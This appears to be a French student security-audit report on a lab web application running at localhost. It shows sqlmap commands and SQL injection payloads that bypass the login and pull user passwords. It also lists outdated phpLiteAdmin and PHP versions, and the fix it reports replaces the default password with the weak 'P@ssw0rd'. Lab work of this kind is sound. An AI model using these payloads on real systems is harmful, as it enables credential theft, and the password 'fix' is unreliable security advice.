# Projet 2

## Identification des failles 

En effectuant un premier test avec sqlmap on peut constater plusieurs choses. Nous avons la liste des tables, le type de la base (SQLite) et le nom de la base de données. On peut modifier les requêtes en conséquences. 

Apparemment la version SLQlite serait vulnérable aux injection UNION et à 

 **POST parameter 'txt_uname' is vulnerable** 

```sh
sqlmap -u "http://localhost:8080/login.php" --batch --tables --forms --crawl=2 --level=5 --risk=3

Database: SQLite_masterdb
[3 tables]
+-----------------+
| message         |
| sqlite_sequence |
| userSti         |
+-----------------+
```

Nous allons maintenant essayé de faire un dump de la table `userSti` afin de savoir si elle contient des credentials. On voit qu'il  y a 4 entrées utilisateur dans la table  userSti.

```sh
sqlmap -u "http://localhost:8080/login.php" --batch --dbms=SQLite -D SQLite_masterdb -T userSti --dump --forms --crawl=2 --level=5 --risk=3
+----+
| id |
+----+
| 1  |
| 2  |
| 3  |
| 5  |
+----+
```

### Injection SQL
La page de connexion est vulnérable à une "Boolean based Blind SQL Injection" sur le champ txt_login
```sql
' or 1=1;#
```

Il est possible de récupérer le script de création des tables sqlite, comme le site web est vulnérable à des unions attaques sur l'URL contact.php
```sql
'UNION select name,sql from sqlite_master;
```
La base de donnée donne 3 scripts de générations dont 2 nous intéresse (message, userSti, sqlite_sequence)
```sql
CREATE TABLE 'message' ('id' integer PRIMARY KEY AUTOINCREMENT, receiptDate DATE NOT NULL, sender integer NULL, receiver integer NULL, sujet varchar (50) NOT NULL, messageBody varchar (500) NOT NULL, CONSTRAINT fk_sender FOREIGN KEY(sender) REFERENCES userSti(id), CONSTRAINT fk_receiver FOREIGN KEY(receiver) REFERENCES userSti(id) )

CREATE TABLE 'userSti' ('id' integer PRIMARY KEY AUTOINCREMENT, username varchar (50) UNIQUE NOT NULL, password varchar (255) NOT NULL, isAdmin INT(1) NOT NULL, isActive INT(1) NOT NULL )
```
Il est possible de récupérer les mots de passe des utilisateurs pour pouvoir les étudier dans un second temps en offline
```sql
'UNION select 1,password from userSti;#
```

### PhpLiteAdmin

Nous avons une version de phpLiteAdmin 1.9.6 qui est vulnérable aux attaques CRSF, XSS et injection Html comme le montre ce [site](https://www.exploit-db.com/exploits/39714) cela permettrait. 

Le deuxième problème vient du fait que le mot de passe par défaut, **admin**,  a été laissé. Cela nous permet d'accéder compétemment aux données de l'application.  

### PHP Version 5.5.9 

La version php actuelle, qui est 5.5.9, est victime de plusieurs vulnérabilité sans exploit connu pour la plupart. Les possibilités les plus importantes sont le déni de service et l'exécution de code selon ce [site](https://www.cvedetails.com/vulnerability-list.php?vendor_id=74&product_id=128&version_id=164957&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&month=0&cweid=0&order=4&trc=101&sha=d8cb459be2a570e543cd95cce804c67332d729a8) 

## Analyse de menace 

## Correctif logiciel 

### PhpLiteAdmin

Nous avons ajouté un correctif avec la version de phpLiteAdmin 1.9.8.2 qui est la dernière version sortie. Nous avons aussi changer le mot de passe par défaut en **P@ssw0rd**. 

### PHP Version et nginx 

Nous avons remplacé la version de php par la version 7.4.13 qui ne souffre pour l'instant d'aucune vulnérabilité. Nous avons aussi profité de faire la mise à jour du serveur nginx même si la version ne souffrait d'aucune vulnérabilité connue.